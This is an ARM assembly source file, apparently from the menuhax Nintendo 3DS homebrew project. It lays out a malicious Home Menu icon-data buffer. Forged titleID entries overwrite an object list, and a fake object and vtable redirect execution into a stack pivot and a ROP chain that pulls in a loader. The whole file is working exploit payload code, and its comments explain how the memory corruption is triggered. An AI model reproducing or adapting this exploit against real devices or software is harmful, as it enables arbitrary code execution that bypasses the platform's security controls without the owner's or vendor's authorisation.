.arm
.section .init
.global _start

#include "menuhax_ropinclude.s"

#define TOTAL_HAX_ICONS 60 //Use the last 60 available "icons".

_start:

@ End of the titleID array - TOTAL_HAX_ICONS.
.fill (((_start + 0x8 + ((360-TOTAL_HAX_ICONS)*8)) - .) / 4), 4, 0xffffffff
.word ROPBUFLOC(object), 0x55667788 @ These two words(as a "titleID") overwrite the target_objectslist_buffer. The rest of the "titleIDs" here aren't used by Home Menu due to the s16 values below. This buffer contains a list of object-ptrs which gets used with a vtable-funcptr +16 call. This jumps to ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR. These objects are used by the main-thread, while the vulnerable function parsing this icon data runs on a seperate thread.

object:
.word ROPBUFLOC(vtable) @ object+0, vtable ptr.
.word 0

vtable: @ Overlap the object and vtable due to lack of space, since ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR uses vtable+0x28.
.word 0
.word 0
.word ROPBUFLOC(object + 0x20) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.
.word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
.word ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR @ vtable funcptr +16. This saves {r4-r8, lr} on the stack, then calls the funcptr from vtable+0x28 below.

//.space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.

stackpivot_sploadword:
.word ROPBUFLOC(ropstackstart) @ sp
stackpivot_pcloadword:
.word ROP_POPPC @ pc

@ vtable+0x28, called by ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR. This then does the usual stack-pivot.
.space ((vtable + 0x28) - .)
.word ROP_LOADR4_FROMOBJR0

@ objptr loaded by ROP_PUSHR4R8LR_CALLVTABLEFUNCPTR.
//.space ((object + 0x34) - .)
.word ROPBUFLOC(object)

ropstackstart:
#include "menuhax_loader.s"

@ Pad to the end of the titleID array, to make sure the above data doesn't get too large.
.space ((_start + 0xb48) - .)

@ End of the s16 array.
.space ((_start + 0xcb0 + ((360-TOTAL_HAX_ICONS)*2)) - .)
.hword 0x5848 @ Offset value, menuhax_manager detects this special value and uses the required value instead.
#if TOTAL_HAX_ICONS > 1
.fill TOTAL_HAX_ICONS-1, 2, 0xffff @ Use 0xffff for the rest of these, so that the titleID doesn't get used.
#endif

@ End of the s8 array.
.space ((_start + 0xf80 + (360-TOTAL_HAX_ICONS)) - .)
.fill TOTAL_HAX_ICONS, 1, 0xff @ Normally this is 0xff, but write this anyway since it's required for this hax.

.space ((_start + 0x2da0) - .)

